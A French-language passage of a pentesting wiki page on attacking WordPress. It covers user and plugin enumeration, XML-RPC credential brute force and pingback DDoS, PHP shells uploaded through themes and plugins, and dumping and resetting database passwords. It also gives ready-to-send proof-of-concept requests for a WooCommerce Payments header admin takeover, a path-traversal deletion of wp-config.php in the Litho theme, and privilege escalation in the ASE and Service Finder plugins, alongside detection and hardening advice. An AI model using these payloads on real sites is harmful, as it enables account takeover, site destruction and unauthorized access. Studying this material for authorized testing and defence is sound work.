# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Informations de base

- **Fichiers t√©l√©vers√©s** se trouvent √† : `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Les fichiers de th√®me se trouvent dans /wp-content/themes/,** donc si vous modifiez du php du th√®me pour obtenir une RCE vous utiliserez probablement ce chemin. Par exemple : En utilisant **le th√®me twentytwelve** vous pouvez **acc√©der** au fichier **404.php** dans : [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Une autre URL utile pourrait √™tre :** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- Dans **wp-config.php** vous pouvez trouver le mot de passe root de la base de donn√©es.
- Chemins de connexion par d√©faut √† v√©rifier : _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Principaux fichiers WordPress**

- `index.php`
- `license.txt` contient des informations utiles comme la version de WordPress install√©e.
- `wp-activate.php` est utilis√© pour le processus d'activation par e-mail lors de la cr√©ation d'un nouveau site WordPress.
- Dossiers de connexion (peuvent √™tre renomm√©s pour les masquer) :
  - `/wp-admin/login.php`
  - `/wp-admin/wp-login.php`
  - `/login.php`
  - `/wp-login.php`
- `xmlrpc.php` est un fichier qui repr√©sente une fonctionnalit√© de WordPress permettant de transmettre des donn√©es via HTTP en tant que m√©canisme de transport et XML comme m√©canisme d'encodage. Ce type de communication a √©t√© remplac√© par l'[REST API](https://developer.wordpress.org/rest-api/reference).
- Le dossier `wp-content` est le r√©pertoire principal o√π les plugins et th√®mes sont stock√©s.
- `wp-content/uploads/` est le r√©pertoire o√π sont stock√©s tous les fichiers t√©l√©vers√©s sur la plateforme.
- `wp-includes/` est le r√©pertoire o√π sont stock√©s les fichiers core, tels que certificats, polices, fichiers JavaScript et widgets.
- `wp-sitemap.xml` Dans les versions de WordPress 5.5 et sup√©rieures, WordPress g√©n√®re un fichier sitemap XML avec tous les posts publics et les types de posts et taxonomies publiquement interrogeables.

**Post-exploitation**

- Le fichier `wp-config.php` contient les informations n√©cessaires √† WordPress pour se connecter √† la base de donn√©es telles que le nom de la base de donn√©es, l'h√¥te de la base, le nom d'utilisateur et le mot de passe, les authentication keys et salts, ainsi que le pr√©fixe des tables de la base de donn√©es. Ce fichier de configuration peut √©galement √™tre utilis√© pour activer le mode DEBUG, ce qui peut √™tre utile pour le d√©pannage.

### Permissions des utilisateurs

- **Administrateur**
- **√âditeur** : Publie et g√®re ses propres articles et ceux des autres
- **Auteur** : Publie et g√®re ses propres articles
- **Contributeur** : R√©dige et g√®re ses articles mais ne peut pas les publier
- **Abonn√©** : Parcourt les articles et √©dite son profil

## **Enum√©ration passive**

### **Obtenir la version de WordPress**

V√©rifiez si vous pouvez trouver les fichiers `/license.txt` ou `/readme.html`

Dans le **code source** de la page (exemple de [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)) :

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- fichiers CSS li√©s

![](<../../images/image (533).png>)

- fichiers JavaScript

![](<../../images/image (524).png>)

### Obtenir des plugins
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Obtenir les th√®mes
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Extraire les versions en g√©n√©ral
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## √ânum√©ration active

### Plugins et th√®mes

Vous ne pourrez probablement pas trouver tous les plugins et th√®mes possibles. Pour tous les d√©couvrir, vous devrez **activement Brute Force une liste de plugins et th√®mes** (avec un peu de chance, il existe des outils automatis√©s qui contiennent ces listes).

### Utilisateurs

- **ID Brute:** Vous obtenez des utilisateurs valides d'un site WordPress en Brute Forcing les IDs des utilisateurs :
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Si les r√©ponses sont **200** ou **30X**, cela signifie que l'id est **valide**. Si la r√©ponse est **400**, alors l'id est **invalide**.

- **wp-json:** Vous pouvez aussi essayer d'obtenir des informations sur les utilisateurs en interrogeant :
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Un autre endpoint `/wp-json/` qui peut r√©v√©ler certaines informations sur les utilisateurs est :
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Note that this endpoint only exposes users that have made a post. **Seules les informations sur les utilisateurs qui ont activ√© cette fonctionnalit√© seront fournies**.

Also note that **/wp-json/wp/v2/pages** could leak IP addresses.

- **Login username enumeration**: Lors de la connexion sur **`/wp-login.php`**, le **message** est **diff√©rent** selon que le **nom d'utilisateur existe ou non**.

### XML-RPC

If `xml-rpc.php` is active, vous pouvez effectuer un credentials brute-force ou l'utiliser pour lancer des attaques DoS contre d'autres ressources. (You can automate this process[ using this](https://github.com/relarizky/wpxploit) for example).

To see if it is active try to access to _**/xmlrpc.php**_ and send this request:

**V√©rifier**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** ou **`metaWeblog.getUsersBlogs`** sont quelques-unes des m√©thodes qui peuvent √™tre utilis√©es pour brute-force credentials. Si vous en trouvez, vous pouvez envoyer quelque chose comme :
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Le message _"Incorrect username or password"_ dans une r√©ponse 200 doit appara√Ætre si les identifiants ne sont pas valides.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

En utilisant les bons identifiants, vous pouvez t√©l√©charger un fichier. Dans la r√©ponse, le chemin appara√Ætra ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Il existe aussi une fa√ßon **plus rapide** de brute-force des credentials en utilisant **`system.multicall`**, car vous pouvez essayer plusieurs credentials dans la m√™me requ√™te :

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

Cette m√©thode est destin√©e aux programmes et non aux humains, et est ancienne, donc elle ne supporte pas la 2FA. Donc, si vous avez des creds valides mais que l'entr√©e principale est prot√©g√©e par la 2FA, **vous pourriez √™tre capable d'abuser de xmlrpc.php pour vous connecter avec ces creds en contournant la 2FA**. Notez que vous ne pourrez pas effectuer toutes les actions possibles via la console, mais vous pourriez quand m√™me parvenir √† une RCE comme l'explique Ippsec dans [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

If you can find the method _**pingback.ping**_ inside the list you can make the Wordpress send an arbitrary request to any host/port.\
Cela peut √™tre utilis√© pour demander √† **des milliers** de sites **Wordpress** d'**acc√©der** √† une m√™me **cible** (provoquant ainsi un **DDoS** sur cette cible) ou vous pouvez l'utiliser pour faire **Wordpress** **scanner** un **r√©seau** interne (vous pouvez indiquer n'importe quel port).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Si vous obtenez **faultCode** avec une valeur **sup√©rieure** √† **0** (17), cela signifie que le port est ouvert.

Regardez l'utilisation de **`system.multicall`** dans la section pr√©c√©dente pour apprendre comment abuser de cette m√©thode afin de provoquer un DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Ce fichier existe g√©n√©ralement √† la racine du site Wordpress : **`/wp-cron.php`**\
Quand ce fichier est **acc√©d√©**, une requ√™te MySQL **"lourde"** est effectu√©e, il peut donc √™tre utilis√© par des **attaquants** pour **provoquer** un **DoS**.\
De plus, par d√©faut, le `wp-cron.php` est appel√© √† chaque chargement de page (chaque fois qu'un client demande une page Wordpress), ce qui peut poser des probl√®mes (DoS) sur des sites √† fort trafic.

Il est recommand√© de d√©sactiver Wp-Cron et de cr√©er un vrai cronjob sur l'h√¥te qui ex√©cute les actions n√©cessaires √† intervalles r√©guliers (sans causer de probl√®mes).

### /wp-json/oembed/1.0/proxy - SSRF

Essayez d'acc√©der √† _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ et le site Wordpress peut effectuer une requ√™te vers vous.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Cet outil v√©rifie l'existence du **methodName: pingback.ping** et du chemin **/wp-json/oembed/1.0/proxy**, et, si pr√©sents, tente un exploit.

## Outils automatiques
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Obtenir l'acc√®s en modifiant un bit

Plus qu'une v√©ritable attaque, il s'agit d'une curiosit√©. Dans le CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man] vous pouviez basculer 1 bit dans n'importe quel fichier wordpress. Ainsi, vous pouviez modifier la position `5389` du fichier `/var/www/html/wp-includes/user.php` pour remplacer l'op√©ration NOT (`!`) par un NOP.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panneau RCE**

**Modification d'un php du th√®me utilis√© (identifiants admin n√©cessaires)**

Appearance ‚Üí Theme Editor ‚Üí 404 Template (√† droite)

Remplacez le contenu par un php shell:

![](<../../images/image (384).png>)

Cherchez sur Internet comment acc√©der √† cette page mise √† jour. Dans ce cas vous devez acc√©der ici: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Vous pouvez utiliser:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
pour obtenir une session.

## RCE par plugin

### Plugin PHP

Il peut √™tre possible d'upload des fichiers .php en tant que plugin.  
Cr√©ez votre php backdoor en utilisant par exemple :

![](<../../images/image (183).png>)

Puis ajoutez un nouveau plugin :

![](<../../images/image (722).png>)

Upload du plugin et cliquez sur Install Now :

![](<../../images/image (249).png>)

Cliquez sur Procced :

![](<../../images/image (70).png>)

Probablement cela ne fera apparemment rien, mais si vous allez dans Media, vous verrez votre shell upload√© :

![](<../../images/image (462).png>)

Acc√©dez-y et vous verrez l'URL pour ex√©cuter le reverse shell :

![](<../../images/image (1006).png>)

### Upload et activation d'un plugin malveillant

Cette m√©thode consiste √† installer un plugin malveillant connu pour √™tre vuln√©rable et pouvant √™tre exploit√© pour obtenir un web shell. Ce processus s'effectue via le tableau de bord WordPress comme suit :

1. **Plugin Acquisition** : Le plugin est obtenu depuis une source comme Exploit DB, par exemple [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation** :
- Allez dans le tableau de bord WordPress, puis `Dashboard > Plugins > Upload Plugin`.
- T√©l√©versez le fichier zip du plugin t√©l√©charg√©.
3. **Activation du plugin** : Une fois le plugin install√© avec succ√®s, il doit √™tre activ√© via le tableau de bord.
4. **Exploitation** :
- Avec le plugin "reflex-gallery" install√© et activ√©, il peut √™tre exploit√© car il est connu pour √™tre vuln√©rable.
- Le framework Metasploit fournit un exploit pour cette vuln√©rabilit√©. En chargeant le module appropri√© et en ex√©cutant des commandes sp√©cifiques, une session meterpreter peut √™tre √©tablie, accordant un acc√®s non autoris√© au site.
- Il est √† noter que ceci n'est qu'une des nombreuses m√©thodes pour exploiter un site WordPress.

Le contenu inclut des aides visuelles montrant les √©tapes dans le tableau de bord WordPress pour l'installation et l'activation du plugin. Cependant, il est important de noter qu'exploiter des vuln√©rabilit√©s de cette mani√®re est ill√©gal et contraire √† l'√©thique sans autorisation appropri√©e. Ces informations doivent √™tre utilis√©es de mani√®re responsable et uniquement dans un cadre l√©gal, tel que le pentesting avec permission explicite.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## De XSS √† RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike) : _**WPXStrike**_ est un script con√ßu pour escalader une vuln√©rabilit√© **Cross-Site Scripting (XSS)** en **Remote Code Execution (RCE)** ou d'autres vuln√©rabilit√©s critiques dans WordPress. Pour plus d'infos consultez [**cet article**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Il fournit **un support pour les versions de WordPress 6.X.X, 5.X.X et 4.X.X et permet de :**
- _**√âl√©vation de privil√®ges :**_ Cr√©e un utilisateur dans WordPress.
- _**(RCE) Upload de plugin personnalis√© (backdoor) :**_ T√©l√©versez votre plugin personnalis√© (backdoor) sur WordPress.
- _**(RCE) √âdition d'un plugin int√©gr√© :**_ Modifie un plugin int√©gr√© dans WordPress.
- _**(RCE) √âdition d'un th√®me int√©gr√© :**_ Modifie un th√®me int√©gr√© dans WordPress.
- _**(Custom) Exploits personnalis√©s :**_ Exploits personnalis√©s pour des plugins/th√®mes WordPress tiers.

## Post Exploitation

Extraire les noms d'utilisateur et mots de passe :
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Changer le mot de passe admin :
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Pentest des plugins Wordpress

### Surface d'attaque

Savoir comment un plugin Wordpress peut exposer des fonctionnalit√©s est essentiel pour trouver des vuln√©rabilit√©s dans son fonctionnement. Vous pouvez voir comment un plugin peut exposer des fonctionnalit√©s dans les points ci‚Äëdessous et quelques exemples de plugins vuln√©rables dans [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Une des mani√®res dont un plugin peut exposer des fonctions aux utilisateurs est via des gestionnaires AJAX. Ceux-ci peuvent contenir des bugs de logique, d'autorisation ou d'authentification. De plus, il est assez fr√©quent que ces fonctions basent √† la fois l'authentification et l'autorisation sur l'existence d'un wordpress nonce que **n'importe quel utilisateur authentifi√© dans l'instance Wordpress pourrait poss√©der** (ind√©pendamment de son r√¥le).

Ces sont les fonctions qui peuvent √™tre utilis√©es pour exposer une fonction dans un plugin:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**L'utilisation de `nopriv` rend l'endpoint accessible par tous les utilisateurs (m√™me les utilisateurs non authentifi√©s).**

> [!CAUTION]
> De plus, si la fonction se contente de v√©rifier l'autorisation de l'utilisateur avec la fonction `wp_verify_nonce`, cette fonction v√©rifie uniquement que l'utilisateur est connect√© ‚Äî elle ne v√©rifie g√©n√©ralement pas le r√¥le de l'utilisateur. Ainsi, des utilisateurs peu privil√©gi√©s pourraient avoir acc√®s √† des actions r√©serv√©es aux utilisateurs √† privil√®ges √©lev√©s.

- **REST API**

Il est √©galement possible d'exposer des fonctions de wordpress en enregistrant une REST API via la fonction `register_rest_route` :
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
Le `permission_callback` est une fonction de rappel qui v√©rifie si un utilisateur donn√© est autoris√© √† appeler la m√©thode API.

**Si la fonction int√©gr√©e `__return_true` est utilis√©e, elle contournera simplement la v√©rification des permissions utilisateur.**

- **Acc√®s direct au fichier PHP**

Bien s√ªr, Wordpress utilise PHP et les fichiers √† l'int√©rieur des plugins sont directement accessibles depuis le web. Ainsi, si un plugin expose une fonctionnalit√© vuln√©rable qui se d√©clenche simplement en acc√©dant au fichier, elle pourra √™tre exploit√©e par n'importe quel utilisateur.

### Trusted-header REST impersonation (WooCommerce Payments ‚â§ 5.6.1)

Certains plugins impl√©mentent des raccourcis ‚Äútrusted header‚Äù pour des int√©grations internes ou des reverse proxies, puis utilisent ce header pour d√©finir le contexte utilisateur courant pour les requ√™tes REST. Si ce header n'est pas li√© cryptographiquement √† la requ√™te par un composant en amont, un attaquant peut le falsifier et appeler des routes REST privil√©gi√©es en tant qu'administrateur.

- Impact : unauthenticated privilege escalation to admin by creating a new administrator via the core users REST route.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (force l'ID utilisateur 1, typiquement le premier compte administrateur).
- Exploited route: `POST /wp-json/wp/v2/users` with an elevated role array.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Why it works

- Le plugin mappe un en-t√™te contr√¥l√© par le client sur l'√©tat d'authentification et saute les v√©rifications de capacit√©.
- Le core WordPress s'attend √† la capability `create_users` pour cette route ; le hack du plugin la contourne en d√©finissant directement le contexte de l'utilisateur courant depuis l'en-t√™te.

Expected success indicators

- HTTP 201 avec un corps JSON d√©crivant l'utilisateur cr√©√©.
- Un nouvel utilisateur admin visible dans `wp-admin/users.php`.

Detection checklist

- Grep pour `getallheaders()`, `$_SERVER['HTTP_...']`, ou des vendor SDKs qui lisent des en-t√™tes personnalis√©s pour d√©finir le contexte utilisateur (par ex., `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Revoir les enregistrements REST pour des callbacks privil√©gi√©s qui n'ont pas de v√©rifications `permission_callback` robustes et qui se fient plut√¥t aux en-t√™tes de la requ√™te.
- Chercher des usages des fonctions core de gestion d'utilisateurs (`wp_insert_user`, `wp_create_user`) dans des handlers REST qui sont prot√©g√©s seulement par des valeurs d'en-t√™te.

Hardening

- Ne jamais d√©river l'authentification ou l'autorisation d'en-t√™tes contr√¥l√©s par le client.
- Si un reverse proxy doit injecter une identit√©, terminer la confiance au niveau du proxy et supprimer les copies entrantes (par ex., `unset X-Wcpay-Platform-Checkout-User` √† la p√©riph√©rie), puis passer un token sign√© et le v√©rifier c√¥t√© serveur.
- Pour les routes REST effectuant des actions privil√©gi√©es, exiger des v√©rifications `current_user_can()` et un `permission_callback` strict (NE PAS utiliser `__return_true`).
- Pr√©f√©rer l'auth premi√®re-partie (cookies, application passwords, OAuth) plut√¥t que l'usurpation d'identit√© via en-t√™te.

References: see the links at the end of this page for a public case and broader analysis.

### Unauthenticated Arbitrary File Deletion via wp_ajax_nopriv (Litho Theme <= 3.0)

Les th√®mes et plugins WordPress exposent fr√©quemment des handlers AJAX via les hooks `wp_ajax_` et `wp_ajax_nopriv_`. Lorsqu'on utilise la variante **_nopriv_** **le callback devient accessible aux visiteurs non authentifi√©s**, donc toute action sensible doit en plus impl√©menter :

1. Une **v√©rification de capability** (par ex. `current_user_can()` ou au minimum `is_user_logged_in()`), et
2. Un **nonce CSRF** valid√© avec `check_ajax_referer()` / `wp_verify_nonce()`, et
3. **Sanitisation / validation stricte des entr√©es**.

Le th√®me multipurpose Litho (< 3.1) a oubli√© ces 3 contr√¥les dans la fonctionnalit√© *Remove Font Family* et a fini par livrer le code suivant (simplifi√©) :
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Probl√®mes introduits par cet extrait :

* **Acc√®s non authentifi√©** ‚Äì the `wp_ajax_nopriv_` hook is registered.
* **No nonce / capability check** ‚Äì tout visiteur peut appeler l'endpoint.
* **Aucune sanitisation de chemin** ‚Äì la cha√Æne contr√¥l√©e par l'utilisateur `fontfamily` est concat√©n√©e √† un chemin du syst√®me de fichiers sans filtrage, permettant le classique parcours `../../`.

#### Exploitation

Un attaquant peut supprimer n'importe quel fichier ou r√©pertoire **sous le r√©pertoire de base uploads** (normalement `<wp-root>/wp-content/uploads/`) en envoyant une seule requ√™te HTTP POST :
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Parce que `wp-config.php` se trouve en dehors de *uploads*, quatre s√©quences `../` suffisent sur une installation par d√©faut. Supprimer `wp-config.php` force WordPress √† lancer l'*assistant d'installation* lors de la visite suivante, permettant une prise de contr√¥le compl√®te du site (l'attaquant fournit simplement une nouvelle configuration DB et cr√©e un utilisateur admin).

D'autres cibles impactantes incluent les fichiers `.php` de plugin/th√®me (pour neutraliser les plugins de s√©curit√©) ou les r√®gles `.htaccess`.

#### Detection checklist

* Tout callback `add_action( 'wp_ajax_nopriv_...')` qui appelle des fonctions du syst√®me de fichiers (`copy()`, `unlink()`, `$wp_filesystem->delete()`, etc.).
* Concat√©nation d'entr√©es utilisateur non assainies dans des chemins (chercher `$_POST`, `$_GET`, `$_REQUEST`).
* Absence de `check_ajax_referer()` et de `current_user_can()`/`is_user_logged_in()`.

#### Durcissement
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// ‚Ä¶ proceed ‚Ä¶
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  üîí  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **Toujours** consid√©rer toute op√©ration d'√©criture/suppression sur le disque comme privil√©gi√©e et v√©rifier doublement :
> ‚Ä¢ Authentification  ‚Ä¢ Autorisation  ‚Ä¢ Nonce  ‚Ä¢ Assainissement des entr√©es  ‚Ä¢ Confinement du chemin (par ex. via `realpath()` plus `str_starts_with()`).

---

### √âl√©vation de privil√®ges via restauration de r√¥le obsol√®te et absence d'autorisation (ASE "View Admin as Role")

De nombreux plugins impl√©mentent une fonction "view as role" ou de changement temporaire de r√¥le en sauvegardant le(s) r√¥le(s) originaux dans les user meta afin de pouvoir les restaurer plus tard. Si le chemin de restauration ne s'appuie que sur des param√®tres de requ√™te (par ex. `$_REQUEST['reset-for']`) et une liste maintenue par le plugin sans v√©rifier les capabilities et un nonce valide, cela devient une √©l√©vation de privil√®ges verticale.

Un exemple r√©el a √©t√© trouv√© dans le plugin Admin and Site Enhancements (ASE) (‚â§ 7.6.2.1). La branche de reset restaurait les r√¥les bas√©e sur `reset-for=<username>` si le nom d'utilisateur apparaissait dans un tableau interne `$options['viewing_admin_as_role_are']`, mais n'effectuait ni un contr√¥le `current_user_can()` ni une v√©rification de nonce avant de supprimer les r√¥les actuels et de r√©ajouter les r√¥les sauvegard√©s depuis le user meta `_asenha_view_admin_as_original_roles` :
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Pourquoi c'est exploitable

- Se fie √† `$_REQUEST['reset-for']` et √† une option du plugin sans autorisation c√¥t√© serveur.
- Si un utilisateur avait auparavant des privil√®ges √©lev√©s enregistr√©s dans `_asenha_view_admin_as_original_roles` et a √©t√© r√©trograd√©, il peut les restaurer en acc√©dant au chemin de r√©initialisation.
- Dans certains d√©ploiements, tout utilisateur authentifi√© pourrait d√©clencher une r√©initialisation pour un autre nom d'utilisateur encore pr√©sent dans `viewing_admin_as_role_are` (autorisation d√©faillante).

Pr√©requis de l'attaque

- Version vuln√©rable du plugin avec la fonctionnalit√© activ√©e.
- Le compte cible poss√®de un r√¥le √† privil√®ges √©lev√©s obsol√®te stock√© dans user meta depuis une utilisation ant√©rieure.
- Toute session authentifi√©e ; absence de nonce/capability sur le flux de reset.

Exploitation (exemple)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
Sur les builds vuln√©rables, cela supprime les r√¥les actuels et r√©ajoute les r√¥les originaux sauvegard√©s (p.ex., `administrator`), ce qui permet d'escalader les privil√®ges.

Detection checklist

- Recherchez des fonctionnalit√©s de changement de r√¥le qui conservent les ¬´ original roles ¬ª dans le user meta (p.ex., `_asenha_view_admin_as_original_roles`).
- Identifiez les chemins de r√©initialisation/restauration qui :
  - Lisent les noms d'utilisateur depuis `$_REQUEST` / `$_GET` / `$_POST`.
  - Modifient les r√¥les via `add_role()` / `remove_role()` sans `current_user_can()` et `wp_verify_nonce()` / `check_admin_referer()`.
  - Autorisent en se basant sur un tableau d'options du plugin (p.ex., `viewing_admin_as_role_are`) au lieu des capacit√©s de l'acteur.

Durcissement

- Appliquez des v√©rifications de capacit√© sur chaque branche modifiant l'√©tat (p.ex., `current_user_can('manage_options')` ou plus strict).
- Exigez des nonces pour toutes les mutations de r√¥les/permissions et v√©rifiez-les : `check_admin_referer()` / `wp_verify_nonce()`.
- Ne faites jamais confiance aux noms d'utilisateur fournis par la requ√™te ; r√©solvez l'utilisateur cible c√¥t√© serveur en fonction de l'acteur authentifi√© et d'une politique explicite.
- Invalidez l'√©tat des r√¥les originaux lors des mises √† jour de profil / de r√¥le afin d'√©viter la restauration obsol√®te de privil√®ges √©lev√©s :
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- Envisagez de stocker un √©tat minimal et d'utiliser des jetons limit√©s dans le temps et prot√©g√©s par la capability pour les changements de r√¥le temporaires.

---

### Escalade de privil√®ges non authentifi√©e via cookie‚Äëtrusted user switching sur le hook public init (Service Finder ‚Äúsf-booking‚Äù)

Certains plugins branchent des helpers de user-switching sur le hook public `init` et d√©rivent l'identit√© d'un cookie contr√¥l√© par le client. Si le code appelle `wp_set_auth_cookie()` sans v√©rifier l'authentification, la capability et un nonce valide, tout visiteur non authentifi√© peut forcer la connexion en tant qu'un ID utilisateur arbitraire.

Sch√©ma vuln√©rable typique (simplifi√© d'apr√®s Service Finder Bookings ‚â§ 6.1) :
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // üî• sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
